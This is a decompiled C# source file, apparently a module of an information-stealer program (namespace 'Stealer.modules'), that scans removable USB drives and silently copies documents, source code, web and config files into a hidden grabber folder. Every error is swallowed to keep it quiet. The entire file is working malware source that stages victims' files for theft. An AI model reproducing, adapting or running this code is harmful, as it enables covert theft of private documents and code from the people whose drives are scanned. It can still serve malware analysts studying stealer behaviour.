using System;
using System.IO;

namespace Stealer.modules
{
	// Token: 0x0200002B RID: 43
	internal class USB
	{
		// Token: 0x060000D4 RID: 212 RVA: 0x0000A255 File Offset: 0x00008455
		public static void GetUSB()
		{
			USB.Copy();
		}

		// Token: 0x060000D5 RID: 213 RVA: 0x0000A25C File Offset: 0x0000845C
		private static void Copy()
		{
			foreach (DriveInfo driveInfo in DriveInfo.GetDrives())
			{
				if (driveInfo.IsReady && driveInfo.DriveType == DriveType.Removable)
				{
					try
					{
						if (!Directory.Exists(USB.GrabberDir))
						{
							Directory.CreateDirectory(USB.GrabberDir);
						}
						USB.CopyDisk(driveInfo.Name, USB.GrabberDir);
					}
					catch
					{
					}
				}
			}
		}

		// Token: 0x060000D6 RID: 214 RVA: 0x0000A2D0 File Offset: 0x000084D0
		public static void CopyDisk(string DirectoryDisk, string LogsPath)
		{
			try
			{
				if (USB.GetDirSize(LogsPath, 0L) < 4500000L)
				{
					if (Directory.GetFiles(DirectoryDisk) != null)
					{
						foreach (string text in Directory.GetFiles(DirectoryDisk))
						{
							string extension = Path.GetExtension(text);
							if ((extension == ".txt" || extension == ".doc" || extension == ".cs" || extension == ".dll" || extension == ".sln" || extension == ".html" || extension == ".htm" || extension == ".xml" || extension == ".php" || extension == ".json") && new FileInfo(text).Length != 0L && new FileInfo(text).Length < 2500000L)
							{
								File.Copy(text, Path.Combine(LogsPath, Path.GetFileName(text)));
							}
						}
					}
					if (Directory.GetDirectories(DirectoryDisk) != null)
					{
						foreach (string directoryDisk in Directory.GetDirectories(DirectoryDisk))
						{
							USB.CopyDisk(directoryDisk, LogsPath);
						}
					}
				}
			}
			catch
			{
			}
		}

		// Token: 0x060000D7 RID: 215 RVA: 0x0000A430 File Offset: 0x00008630
		public static long GetDirSize(string path, long size = 0L)
		{
			try
			{
				foreach (string fileName in Directory.EnumerateFiles(path))
				{
					try
					{
						size += new FileInfo(fileName).Length;
					}
					catch
					{
					}
				}
				foreach (string path2 in Directory.EnumerateDirectories(path))
				{
					try
					{
						size += USB.GetDirSize(path2, 0L);
					}
					catch
					{
					}
				}
			}
			catch
			{
			}
			return size;
		}

		// Token: 0x04000083 RID: 131
		private static string GrabberDir = Program.path + "\\FilesUSB\\";
	}
}
